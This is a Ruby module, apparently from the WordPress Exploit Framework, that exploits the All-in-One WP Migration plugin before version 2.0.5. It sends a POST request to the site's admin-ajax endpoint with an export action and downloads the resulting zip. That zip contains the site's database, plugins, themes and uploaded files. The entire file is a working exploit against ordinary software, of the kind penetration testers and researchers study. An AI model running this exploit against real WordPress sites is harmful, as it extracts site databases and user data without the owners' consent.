# frozen_string_literal: true

class Wpxf::Auxiliary::AllInOneMigrationExport < Wpxf::Module
  include Wpxf::WordPress::FileDownload

  def initialize
    super

    update_info(
      name: 'All-in-One Migration Export',
      desc: %(
        This module allows you to export WordPress data (such as the
        database, plugins, themes, uploaded files, etc) via the
        All-in-One Migration plugin in versions < 2.0.5.
      ),
      author: [
        'James Golovich', # Disclosure
        'rastating'       # WPXF module
      ],
      references: [
        ['WPVDB', '7857'],
        ['URL', 'http://www.pritect.net/blog/all-in-one-wp-migration-2-0-4-security-vulnerability']
      ],
      date: 'Mar 19 2015'
    )

    register_option(
      IntegerOption.new(
        name: 'http_client_timeout',
        desc: 'Max wait time in seconds for HTTP responses',
        default: 300,
        required: true
      )
    )

    unregister_option(get_option('remote_file'))
  end

  def check
    check_plugin_version_from_readme('all-in-one-wp-migration', '2.0.5')
  end

  def working_directory
    ''
  end

  def download_request_method
    :post
  end

  def download_request_body
    { 'options[action]' => 'export' }
  end

  def download_request_params
    { 'action' => 'router' }
  end

  def downloader_url
    wordpress_url_admin_ajax
  end

  def file_extension
    '.zip'
  end
end
